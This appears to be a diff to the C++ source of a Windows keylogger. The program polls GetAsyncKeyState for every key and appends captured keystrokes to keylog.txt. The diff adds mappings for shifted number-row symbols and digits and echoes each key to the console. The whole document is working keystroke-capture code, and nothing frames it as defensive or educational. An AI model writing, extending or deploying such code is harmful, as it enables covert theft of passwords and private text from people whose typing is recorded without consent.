@@ -6,7 +6,6 @@
 #include <fstream>
 
 using namespace std;
-//bool x1,y1,x2,y2,x3,y3,x4,y4,x5,y5,x6,y6,x7,y7,x8,y8,x9,y9,y11,x11;
 bool x, y;
 
 void Log(string input){
@@ -19,6 +18,7 @@ void Log(string input){
 }
 
 bool SpecialKeys(int);
+bool upNum(int);
 int keylog1(bool ,bool);  // ~
 int keylog2(bool ,bool);  // '
 int keylog3(bool ,bool); // ]
@@ -53,15 +53,19 @@ int main(){
 		for (int KEY = 8; KEY <= 190; KEY++){
 			if(GetAsyncKeyState(VK_SHIFT) == -32768 ){
 				if (GetAsyncKeyState(KEY) == -32767 ){
+					if (upNum(KEY) == false){
 					fstream LogFile;
 					LogFile.open("keylog.txt", fstream::app);
 					
-					if (LogFile.is_open()) {
+						if (LogFile.is_open()) {
+						cout << char(KEY);
 						LogFile << char(KEY);
 						LogFile.close();
-					}
+						}
+					}	
 				}
 			}
+			
 			else if (GetAsyncKeyState(KEY) == -32767){ //When you press.
 				if (SpecialKeys(KEY) == false){ //check S_Key.
 
@@ -69,6 +73,7 @@ int main(){
 					LogFile.open("keylog.txt", fstream::app);
 					
 					if (LogFile.is_open()) {
+						cout << char(KEY+32);
 						LogFile << char(KEY+32);
 						LogFile.close();
 					}	
@@ -146,8 +151,95 @@ bool SpecialKeys(int S_Key){
 		cout << "-";
 		Log("-");
 		return true;
+	case '0':
+		cout << "0";
+		Log("0");
+		return true;
+	case '1':
+		cout << "1";
+		Log("1");
+		return true;
+	case '2':
+		cout << "2";
+		Log("2");
+		return true;
+	case '3':
+		cout << "3";
+		Log("3");
+		return true;
+	case '4':
+		cout << "4";
+		Log("4");
+		return true;
+	case '5':
+		cout << "5";
+		Log("5");
+		return true;
+	case '6':
+		cout << "6";
+		Log("6");
+		return true;
+	case '7':
+		cout << "7";
+		Log("7");
+		return true;
+	case '8':
+		cout << "8";
+		Log("8");
+		return true;
+	case '9':
+		cout << "9";
+		Log("9");
+		return true;
 	default: 
 		return false;
+	}
+}
+
+bool upNum(int N_key){
+	switch (N_key){
+	case '0':
+		cout << ")";
+		Log(")");
+		return true;
+	case '1':
+		cout << "!";
+		Log("!");
+		return true;
+	case '2':
+		cout << "@";
+		Log("@");
+		return true;
+	case '3':
+		cout << "#";
+		Log("#");
+		return true;
+	case '4':
+		cout << "$";
+		Log("$");
+		return true;
+	case '5':
+		cout << "%";
+		Log("%");
+		return true;
+	case '6':
+		cout << "^";
+		Log("^");
+		return true;
+	case '7':
+		cout << "&";
+		Log("&");
+		return true;
+	case '8':
+		cout << "*";
+		Log("*");
+		return true;
+	case '9':
+		cout << "(";
+		Log("(");
+		return true;
+	default:
+		return false;	
 	}
 }
 
